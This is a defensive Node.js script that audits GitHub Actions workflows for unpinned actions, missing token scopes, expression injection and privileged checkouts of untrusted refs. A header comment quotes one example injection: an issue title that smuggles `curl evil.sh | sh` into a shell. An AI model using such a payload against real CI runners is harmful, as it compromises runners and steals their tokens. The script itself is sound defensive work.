#!/usr/bin/env node
// Every workflow scopes its token, no NEW action floats on a mutable tag, and no
// event data reaches a shell as CODE.
//
// THE GAP THIS CLOSES: `ci.yml`'s header says every action is pinned to a full
// commit SHA. That was true of `ci.yml` and of nothing else — `release.yml` and
// `security.yml` carry tag-pinned actions, and `release.yml` is the workflow with
// `packages: write`, `id-token: write` and `attestations: write`: the one that
// signs and publishes the image an operator pins to. A tag is a pointer its owner
// can move. That is the reach a supply-chain compromise wants.
//
// It also caught a `permissions:`-less workflow (`ai-review.yml`, a scaffold that
// echoed a TODO and reported a green "AI review" check), which is now deleted.
//
// A RATCHET, NOT A SWEEP — the same shape as ruff.toml:
//
//   The refs below are the ones that float TODAY. Each is listed with why it is
//   still floating. The check passes with the list and FAILS on anything not in
//   it, so the debt is enumerable, it cannot grow, and burning it down is deleting
//   entries. Never add an entry to make a red build green without saying why here.
//
// WHY THE LIST IS NOT SIMPLY EMPTIED: resolving a tag to its commit SHA requires
// asking GitHub what the tag currently points at. Inventing a SHA does not pin an
// action, it breaks the workflow. `--resolve` does the lookup and rewrites the
// files in place; it needs network, so it cannot be part of the ratchet CI runs.
//
// IT IS NO LONGER A COMMAND SOMEONE HAS TO REMEMBER. That was the actual reason
// this list survived every session that read it and agreed with it: the fix was a
// maintainer chore with no owner. `.github/workflows/pin-actions.yml` now runs
// `--resolve` weekly on a runner (which has both network and a token), prunes the
// entries it burned down, and opens the pull request. The ratchet below still
// blocks anything NEW, on every push and PR, offline.
//
// THE DOCKERFILE IS DELIBERATELY OUT OF SCOPE. `ARG NODE_IMAGE=node:24-bookworm-slim`
// is a build-arg DEFAULT whose whole purpose is to be overridden (its header says
// so: swap the base to get a different Python minor, or a different arch). Pinning
// a self-hoster's overridable base by digest would freeze the one knob the image
// exposes, and the artifact operators actually pin — the published image — is
// already immutable by digest and carries a provenance attestation (release.yml).
// The exposure here is a build-time base, not a signed published one.
//
// THE INJECTION RULES ARE A DIFFERENT FAILURE WITH THE SAME SHAPE.
// `${{ ... }}` is not a shell variable. Actions substitutes the expression into
// the script TEXT before bash is started, so `${{ github.event.issue.title }}` in
// a `run:` line is the issue title *as code*: an issue called
// `x"; curl evil.sh | sh; #` runs on the runner, with that job's token. This
// repository dispatches agents from issues and publishes signed images, so the
// distance from a stranger's text to the supply chain is exactly one such line.
//
// The rule: nothing an outsider (or a previous step, or a model) can influence
// may be interpolated into a `run:` script. Pass it through `env:` on the step
// and read `"$VAR"` — bash then sees a value, never a command. TRUSTED_IN_RUN
// below is the short list of contexts that are fixed-shape and repo-controlled;
// everything else is blocking, including `steps.*.outputs.*` and `needs.*`,
// whose values are produced by earlier steps and are therefore only as trusted
// as whatever wrote them.
//
// TWO MORE SINKS REACH CODE WITHOUT GOING THROUGH `run:`, and each is blocking:
//
//   script-injection    `actions/github-script` evaluates its `script:` input as
//                       JavaScript. Actions substitutes into that text the same
//                       way, so the rule and the fix are identical — only the
//                       interpreter differs. Unused here today; a ratchet exists
//                       to make the first arrival visible rather than to describe
//                       the present.
//
//   untrusted-checkout  `pull_request_target` and `workflow_run` run with the
//                       BASE repository's token and secrets while the event
//                       describes someone else's pull request. Checking out a ref
//                       the event points at puts a fork's tree inside that job,
//                       and `npm ci` alone is enough to finish the job for them.
//                       No expression is executed as text here — the code arrives
//                       as files instead, which is why the `run:` reader cannot
//                       see it and this rule is separate.
//
//   npm run security:actions              # the ratchet (CI runs this)
//   npm run security:actions -- --resolve # rewrite the allowlisted refs to SHAs
//   npm run security:actions -- --json
//
// EXIT CODES: 0 clean · 1 an unpinned ref outside the allowlist, a workflow with
// no `permissions:` block, an expression interpolated into a `run:` or a
// `script:`, or a privileged trigger checking out an event-derived ref.

import fs from 'node:fs';
import path from 'node:path';
import { REPO_ROOT } from '../review/diff.mjs';

export const WORKFLOW_DIR = '.github/workflows';
export const ALLOWLIST_PATH = '.github/actions-pin-allowlist.json';

/**
 * Known-floating refs, read from the JSON file so `--resolve` can prune the ones
 * it burns down. `ref` is matched exactly against the text after `@`.
 *
 * A MISSING OR UNREADABLE FILE MEANS AN EMPTY LIST, which makes every floating
 * ref blocking. That is the safe direction: an allowlist that fails to load must
 * not read as "everything is excused".
 */
export function loadAllowlist(root = REPO_ROOT) {
  try {
    const parsed = JSON.parse(fs.readFileSync(path.join(root, ALLOWLIST_PATH), 'utf8'));
    return Array.isArray(parsed.allow) ? parsed.allow : [];
  } catch {
    return [];
  }
}

/** Write the list back, preserving the `$comment` header a reader needs. */
export function saveAllowlist(allow, root = REPO_ROOT) {
  const file = path.join(root, ALLOWLIST_PATH);
  const current = JSON.parse(fs.readFileSync(file, 'utf8'));
  fs.writeFileSync(file, `${JSON.stringify({ ...current, allow }, null, 2)}\n`, 'utf8');
}

export const PIN_ALLOWLIST = loadAllowlist();

const SHA_RE = /^[0-9a-f]{40}$/;
const USES_RE = /^\s*(?:-\s*)?uses:\s*(['"]?)([^'"\s#]+)\1/;

/** A ref is pinned when it is a full commit SHA, or the action is local to this repo. */
export function isPinned(uses) {
  if (uses.startsWith('./') || uses.startsWith('.\\')) return true; // a path in this tree
  if (uses.startsWith('docker://')) return /@sha256:[0-9a-f]{64}$/.test(uses);
  const at = uses.lastIndexOf('@');
  if (at === -1) return false;
  return SHA_RE.test(uses.slice(at + 1));
}

export function splitUses(uses) {
  const at = uses.lastIndexOf('@');
  return at === -1 ? { action: uses, ref: null } : { action: uses.slice(0, at), ref: uses.slice(at + 1) };
}

export function allowlisted(uses, allowlist = PIN_ALLOWLIST) {
  const { action, ref } = splitUses(uses);
  return allowlist.find((e) => e.uses === action && e.ref === ref) ?? null;
}

/** Every `uses:` in a workflow, with its 1-based line number. */
export function usesIn(text) {
  const out = [];
  text.split(/\r?\n/).forEach((line, i) => {
    if (/^\s*#/.test(line)) return;
    const m = USES_RE.exec(line);
    if (m) out.push({ uses: m[2], line: i + 1 });
  });
  return out;
}

/**
 * A workflow must scope GITHUB_TOKEN at the top level. Job-level `permissions:`
 * blocks are additive per job and say nothing about the jobs that lack one, so
 * they do not substitute: without the top-level block those jobs inherit the
 * repository default, which is write-all on many repositories.
 */
export function hasTopLevelPermissions(text) {
  return /^permissions:/m.test(text);
}

/**
 * `{ <jobId>: { <scope>: <level> } | 'read-all' | null }` — the job-level
 * `permissions:` block of every job, or `null` for a job that declares none and
 * therefore inherits the workflow's.
 *
 * WHY A READER AND NOT A BOOLEAN: `hasTopLevelPermissions` above answers "is the
 * token scoped at all", which is the question that catches a NEW workflow. It
 * cannot answer the one that matters for a workflow already handling untrusted
 * content — *how much* can a hostile input reach. A scope is widened by adding
 * one line, in a file most reviewers skim; naming the expected set in a fixture
 * is what turns that into a deliberate act (see gate-check.test.mjs).
 *
 * Line-based for the same reason as `blockScalarLines`: this file stays
 * dependency-free so the ratchet runs in jobs that never `npm ci`.
 */
export function jobPermissions(text) {
  const lines = text.split(/\r?\n/);
  const out = {};
  let i = lines.findIndex((l) => /^jobs:[ \t]*(#.*)?$/.test(l));
  if (i === -1) return out;

  let jobIndent = null;
  let job = null;
  let keyIndent = null;
  let scopes = null;
  const close = () => {
    if (job) out[job] = scopes;
  };

  for (i += 1; i < lines.length; i++) {
    const line = lines[i];
    if (line.trim() === '' || /^\s*#/.test(line)) continue;
    const lead = /^\s*/.exec(line)[0].length;
    if (lead === 0) break; // back out to a top-level key: `jobs:` is over
    if (jobIndent === null) jobIndent = lead;

    if (lead === jobIndent) {
      close();
      job = /^\s*([A-Za-z_][A-Za-z0-9_-]*):/.exec(line)?.[1] ?? null;
      keyIndent = null;
      scopes = null;
      continue;
    }
    if (!job) continue;
    if (keyIndent === null) keyIndent = lead;
    // Deeper than the job's own keys — inside `steps:`, `strategy:`, `with:`.
    // A step input that happens to be called `permissions:` is not this.
    if (lead !== keyIndent) continue;

    const p = /^\s*permissions:[ \t]*(.*)$/.exec(line);
    if (!p) continue;
    // `permissions:` may be followed by a comment rather than a value, in which
    // case the block below is still the scope — so strip a comment that starts
    // the remainder, not only one that trails a value.
    const inline = p[1].replace(/(^|\s)#.*$/, '').trim();
    if (inline) {
      // `permissions: read-all` / `write-all` / `{}` — a whole-token verdict.
      scopes = inline === '{}' ? {} : inline;
      continue;
    }
    scopes = {};
    for (let j = i + 1; j < lines.length; j++) {
      if (lines[j].trim() === '' || /^\s*#/.test(lines[j])) continue;
      if (/^\s*/.exec(lines[j])[0].length <= keyIndent) break;
      const kv = /^\s*([a-z][a-z-]*):[ \t]*([A-Za-z-]+)/.exec(lines[j]);
      if (kv) scopes[kv[1]] = kv[2];
    }
  }
  close();
  return out;
}

// --- run: scripts, and what may be substituted into one -----------------------

/**
 * Every line of every `<key>:` script, with its 1-based line number. Both forms
 * matter: the inline one (`- run: npm ci`) and the block scalar (`run: |`),
 * which is where the multi-line shell that actually gets exploited lives.
 *
 * Deliberately a line reader rather than a YAML parse: this file is dependency-
 * free by design (the ratchet has to run in jobs that never `npm ci`), and the
 * shape it needs — "which lines end up inside a script" — is decided by
 * indentation, which survives being read line by line.
 */
export function blockScalarLines(text, key = 'run') {
  const lines = text.split(/\r?\n/);
  const head = new RegExp(`^(\\s*)(-\\s+)?${key}:[ \\t]*(.*)$`);
  const out = [];
  let i = 0;
  while (i < lines.length) {
    const m = head.exec(lines[i]);
    if (!m) {
      i += 1;
      continue;
    }
    const indent = m[1].length + (m[2] ? m[2].length : 0);
    const rest = m[3].trim();
    // `|`, `>`, `|-`, `>-`, `|+`, `>2` … are block indicators, not script.
    if (rest && !/^[|>][+-]?\d*$/.test(rest)) {
      out.push({ line: i + 1, text: rest });
      i += 1;
      continue;
    }
    let j = i + 1;
    for (; j < lines.length; j++) {
      if (lines[j].trim() === '') continue;
      if (/^\s*/.exec(lines[j])[0].length <= indent) break;
      out.push({ line: j + 1, text: lines[j] });
    }
    i = j;
  }
  return out;
}

/** The shell scripts. `${{ }}` here is substituted into bash's input. */
export const runScriptLines = (text) => blockScalarLines(text, 'run');

/**
 * The OTHER interpreter a workflow can hand an expression to. `actions/github-
 * script` runs its `script:` input as JavaScript, and Actions substitutes into
 * that text exactly as it does into a `run:` — so `${{ github.event.issue.body }}`
 * inside one closes the same loop with `require('child_process')` instead of a
 * semicolon. Nothing in this repository uses the action today; the point of a
 * ratchet is that the FIRST one cannot arrive unnoticed.
 *
 * Gated on the action appearing in the file, because `script:` is an ordinary
 * word that other actions take as a plain string input.
 */
export function githubScriptLines(text) {
  return /actions\/github-script[@\s]/.test(text) ? blockScalarLines(text, 'script') : [];
}

/**
 * Contexts whose value cannot be steered by anyone outside this repository AND
 * whose shape is fixed (an id, a SHA, a URL, a value written in the workflow
 * file itself). Everything absent from this list is blocking in a `run:`.
 *
 * `github.event.*` is absent on purpose — all of it is event payload, and the
 * numeric-looking fields are not worth the exception: the reader of the next
 * workflow should not have to know which halves of a payload are safe.
 */
export const TRUSTED_IN_RUN = [
  /^runner\./,
  /^job\./,
  /^strategy\./,
  /^matrix\./, // values written in the workflow file
  /^github\.(repository|repository_id|repository_owner|repository_owner_id|sha|run_id|run_number|run_attempt|workflow|workflow_sha|event_name|job|action|action_repository|workspace|api_url|server_url|graphql_url|retention_days)$/,
];

const EXPRESSION_RE = /\$\{\{([\s\S]*?)\}\}/g;
const CONTEXT_RE = /\b(github|env|inputs|secrets|steps|needs|vars|matrix|runner|job|strategy)((?:\.[A-Za-z0-9_-]+)*)/g;

/** Every context path referenced by one `${{ … }}` expression body. */
export function contextRefs(expression) {
  return [...expression.matchAll(CONTEXT_RE)].map((m) => `${m[1]}${m[2]}`);
}

export const isTrustedInRun = (ref) => TRUSTED_IN_RUN.some((re) => re.test(ref));

/** `[{ ref, line }]` — the untrusted substitutions in a set of script lines. */
function untrustedIn(scriptLines) {
  const out = [];
  for (const { line, text: script } of scriptLines) {
    for (const [, body] of script.matchAll(EXPRESSION_RE)) {
      for (const ref of contextRefs(body)) {
        if (!isTrustedInRun(ref)) out.push({ ref, line });
      }
    }
  }
  return out;
}

/** `[{ ref, line }]` — the substitutions a shell in this workflow would execute. */
export const untrustedRunRefs = (text) => untrustedIn(runScriptLines(text));

/** The same, for the JavaScript `actions/github-script` would evaluate. */
export const untrustedScriptRefs = (text) => untrustedIn(githubScriptLines(text));

// --- pull_request_target: the privileged trigger -------------------------------

/**
 * Triggers that run with the BASE repository's token and secrets while the event
 * describes a fork's pull request. That combination is the whole hazard: on
 * `pull_request` a fork gets a read-only token whatever the file says, but on
 * these two the job holds everything the repository holds.
 */
export const DANGEROUS_TRIGGERS = ['pull_request_target', 'workflow_run'];

/** The top-level `on:` keys. Handles `on: push`, `on: [a, b]` and the block form. */
export function triggersIn(text) {
  const lines = text.split(/\r?\n/);
  for (let i = 0; i < lines.length; i++) {
    const m = /^["']?on["']?:[ \t]*(.*)$/.exec(lines[i]);
    if (!m) continue;
    const inline = m[1].trim();
    if (inline && !inline.startsWith('#')) {
      return inline
        .replace(/^\[|\]$/g, '')
        .split(',')
        .map((t) => t.trim().replace(/['"]/g, ''))
        .filter(Boolean);
    }
    // Block form: the keys at the FIRST indent level under `on:`. Anything
    // deeper is a trigger's own filter (`types:`, `branches:`), not a trigger.
    const out = [];
    let indent = null;
    for (let j = i + 1; j < lines.length; j++) {
      if (lines[j].trim() === '' || /^\s*#/.test(lines[j])) continue;
      const lead = /^\s*/.exec(lines[j])[0].length;
      if (lead === 0) break;
      if (indent === null) indent = lead;
      if (lead > indent) continue;
      const k = /^\s*([A-Za-z_][A-Za-z0-9_-]*):/.exec(lines[j]);
      if (k) out.push(k[1]);
    }
    return out;
  }
  return [];
}

/** `[{ value, line }]` — the `ref:` each checkout step is told to fetch. */
export function checkoutRefs(text) {
  const lines = text.split(/\r?\n/);
  const out = [];
  let inCheckout = false;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (/^\s*#/.test(line)) continue;
    if (/^\s*-\s/.test(line)) inCheckout = false; // a new step begins
    const u = USES_RE.exec(line);
    if (u) {
      inCheckout = /(?:^|\/)checkout@/.test(u[2]);
      continue;
    }
    if (!inCheckout) continue;
    const r = /^\s*ref:[ \t]*(.+?)\s*$/.exec(line);
    if (r) out.push({ value: r[1], line: i + 1 });
  }
  return out;
}

/**
 * `[{ ref, line }]` — a privileged trigger checking out code the event points at.
 * On `pull_request_target` the DEFAULT checkout is the base branch and is safe;
 * naming an event-derived ref is what swaps a stranger's tree into a job that
 * holds the repository's secrets, and it only has to run their `npm ci`.
 */
export function untrustedCheckoutRefs(text) {
  if (!triggersIn(text).some((t) => DANGEROUS_TRIGGERS.includes(t))) return [];
  const out = [];
  for (const { value, line } of checkoutRefs(text)) {
    for (const [, body] of value.matchAll(EXPRESSION_RE)) {
      for (const ref of contextRefs(body)) {
        if (!isTrustedInRun(ref)) out.push({ ref, line });
      }
    }
  }
  return out;
}

const finding = (severity, rule, file, line, message, fix) => ({ severity, rule, file, line, message, fix });

/** Pure. `files` is `[{file, text}]`. */
export function runChecks(files, allowlist = PIN_ALLOWLIST) {
  const out = [];
  const seen = new Set();

  for (const { file, text } of files) {
    if (!hasTopLevelPermissions(text)) {
      out.push(
        finding(
          'blocking',
          'no-permissions',
          file,
          1,
          'This workflow has no top-level `permissions:` block.',
          'Every job in it inherits the repository default for GITHUB_TOKEN. Add `permissions:\\n  contents: read` ' +
            'and widen per job only where a job genuinely writes something.',
        ),
      );
    }

    for (const { ref, line } of untrustedRunRefs(text)) {
      out.push(
        finding(
          'blocking',
          'run-injection',
          file,
          line,
          `\`\${{ ${ref} }}\` is substituted into a \`run:\` script.`,
          'Actions expands it into the script text before bash starts, so its value is executed as code. ' +
            `Move it to \`env:\` on that step (e.g. \`MY_VAR: \${{ ${ref} }}\`) and read \`"$MY_VAR"\` in the ` +
            'script — bash then sees a value. If it is genuinely fixed-shape and repo-controlled, add it to ' +
            'TRUSTED_IN_RUN with the reason, rather than making this pass by moving the line.',
        ),
      );
    }

    for (const { ref, line } of untrustedScriptRefs(text)) {
      out.push(
        finding(
          'blocking',
          'script-injection',
          file,
          line,
          `\`\${{ ${ref} }}\` is substituted into an \`actions/github-script\` \`script:\` body.`,
          'That input is evaluated as JavaScript, and the expression is expanded into its text before the ' +
            `interpreter reads it — the \`run:\` hazard with a different shell. Move it to \`env:\` on that step ` +
            `(\`MY_VAR: \${{ ${ref} }}\`) and read \`process.env.MY_VAR\`.`,
        ),
      );
    }

    for (const { ref, line } of untrustedCheckoutRefs(text)) {
      out.push(
        finding(
          'blocking',
          'untrusted-checkout',
          file,
          line,
          `This workflow runs on ${triggersIn(text)
            .filter((t) => DANGEROUS_TRIGGERS.includes(t))
            .join('/')} and checks out \`\${{ ${ref} }}\`.`,
          "Those triggers run with the base repository's token and secrets, so checking out a ref the event " +
            "points at puts a stranger's tree — its lockfile, its config, its npm lifecycle scripts — inside a " +
            "privileged job. Leave the checkout on the default (base) ref and read the fork's code as DATA, or " +
            'move the job to `pull_request`, where a fork token is read-only whatever this file declares.',
        ),
      );
    }

    for (const { uses, line } of usesIn(text)) {
      if (isPinned(uses)) continue;
      const entry = allowlisted(uses, allowlist);
      if (entry) {
        seen.add(`${entry.uses}@${entry.ref}`);
        out.push(
          finding('warn', 'unpinned-known', file, line, `${uses} floats on a mutable tag.`, `Known debt — ${entry.why}`),
        );
        continue;
      }
      out.push(
        finding(
          'blocking',
          'unpinned',
          file,
          line,
          `${uses} is pinned to a mutable ref.`,
          'Pin it to the full commit SHA with a trailing `# vX.Y.Z` comment (Dependabot updates both). ' +
            '`npm run security:actions -- --resolve` does the lookup. Do not add it to PIN_ALLOWLIST to ' +
            'make this pass — the list is debt already incurred, not a way to incur more.',
        ),
      );
    }
  }

  // A stale allowlist entry is its own kind of rot: it reads as "still floating"
  // long after the ref was pinned or the step deleted, and the next reader trusts
  // it. Deleting entries is how this list is supposed to end.
  for (const entry of allowlist) {
    if (!seen.has(`${entry.uses}@${entry.ref}`)) {
      out.push(
        finding(
          'blocking',
          'stale-allowlist',
          'scripts/security/check-actions.mjs',
          1,
          `PIN_ALLOWLIST still lists ${entry.uses}@${entry.ref}, which no workflow uses.`,
          'Delete the entry. An allowlist that outlives what it excused is how the exception becomes the rule.',
        ),
      );
    }
  }

  return out;
}

export function loadWorkflows(root = REPO_ROOT) {
  const dir = path.join(root, WORKFLOW_DIR);
  if (!fs.existsSync(dir)) return [];
  return fs
    .readdirSync(dir)
    .filter((f) => /\.ya?ml$/.test(f))
    .sort()
    .map((f) => ({ file: `${WORKFLOW_DIR}/${f}`, text: fs.readFileSync(path.join(dir, f), 'utf8') }));
}

// --- --resolve: the only honest way to empty the allowlist --------------------

const API = 'https://api.github.com';

/**
 * Resolve `owner/repo[/sub]@tag` to the COMMIT sha the tag points at.
 * An annotated tag points at a tag object, which must be dereferenced — pinning
 * to the tag object's own sha would not match what Actions resolves.
 */
export async function resolveRef(uses, { token = null, fetchImpl = fetch } = {}) {
  const { action, ref } = splitUses(uses);
  const [owner, repo] = action.split('/');
  const headers = {
    accept: 'application/vnd.github+json',
    'user-agent': 'kp-check-actions',
    ...(token ? { authorization: `Bearer ${token}` } : {}),
  };
  const get = async (url) => {
    const res = await fetchImpl(url, { headers });
    if (!res.ok) throw new Error(`GET ${url} returned ${res.status}`);
    return res.json();
  };
  const obj = (await get(`${API}/repos/${owner}/${repo}/git/ref/tags/${encodeURIComponent(ref)}`)).object;
  if (obj.type === 'commit') return { sha: obj.sha, tag: ref };
  const deref = (await get(`${API}/repos/${owner}/${repo}/git/tags/${obj.sha}`)).object;
  return { sha: deref.sha, tag: ref };
}

export function rewriteUses(text, uses, sha, tag) {
  const { action } = splitUses(uses);
  return text
    .split(/\r?\n/)
    .map((line) => {
      const m = USES_RE.exec(line);
      if (!m || m[2] !== uses) return line;
      // Keep the indentation and any leading `- `; replace the whole rest of the
      // line, which is why this only ever runs on refs that carry no comment yet.
      return `${line.slice(0, m[0].indexOf('uses:'))}uses: ${action}@${sha} # ${tag}`;
    })
    .join('\n');
}

// --- CLI ---------------------------------------------------------------------

export function parseArgs(argv) {
  return { resolve: argv.includes('--resolve'), json: argv.includes('--json') };
}

export function render(findings) {
  if (findings.length === 0)
    return 'check-actions: every action is pinned, every workflow scopes its token, no expression reaches an interpreter, and no privileged trigger checks out an event-derived ref.';
  const lines = findings.map(
    (f) => `${f.severity === 'blocking' ? 'BLOCK' : ' note'}  ${f.file}:${f.line}  [${f.rule}] ${f.message}\n        ${f.fix}`,
  );
  const blocking = findings.filter((f) => f.severity === 'blocking').length;
  lines.push('', `${blocking} blocking, ${findings.length - blocking} note(s).`);
  return lines.join('\n');
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const files = loadWorkflows();

  if (args.resolve) {
    const token = process.env.GH_TOKEN || process.env.GITHUB_TOKEN || null;
    const burned = new Set();
    for (const f of files) {
      let text = f.text;
      let changed = false;
      for (const { uses } of usesIn(text)) {
        if (isPinned(uses)) continue;
        const { sha, tag } = await resolveRef(uses, { token });
        text = rewriteUses(text, uses, sha, tag);
        changed = true;
        burned.add(uses);
        console.log(`  ${f.file}: ${uses} -> ${sha} # ${tag}`);
      }
      if (changed) fs.writeFileSync(path.join(REPO_ROOT, f.file), text);
    }

    // Prune what was just burned. An allowlist that outlives what it excused is
    // its own rot — and the `stale-allowlist` rule below would (correctly) make
    // the resulting pull request red if this did not happen in the same pass.
    const kept = loadAllowlist().filter((e) => !burned.has(`${e.uses}@${e.ref}`));
    if (kept.length !== PIN_ALLOWLIST.length) {
      saveAllowlist(kept);
      console.log(`  ${ALLOWLIST_PATH}: ${PIN_ALLOWLIST.length - kept.length} entr(ies) pruned, ${kept.length} left.`);
    }

    console.log(
      burned.size === 0
        ? 'check-actions: nothing to resolve — every reference is already a commit SHA.'
        : `check-actions: resolved ${burned.size} reference(s). Re-run without --resolve to confirm.`,
    );
    return;
  }

  const findings = runChecks(files);
  if (args.json) console.log(JSON.stringify(findings, null, 2));
  else console.log(render(findings));
  process.exit(findings.some((f) => f.severity === 'blocking') ? 1 : 0);
}

if (process.argv[1]?.endsWith('check-actions.mjs')) {
  main().catch((err) => {
    console.error(`check-actions: ${err.message}`);
    process.exit(1);
  });
}
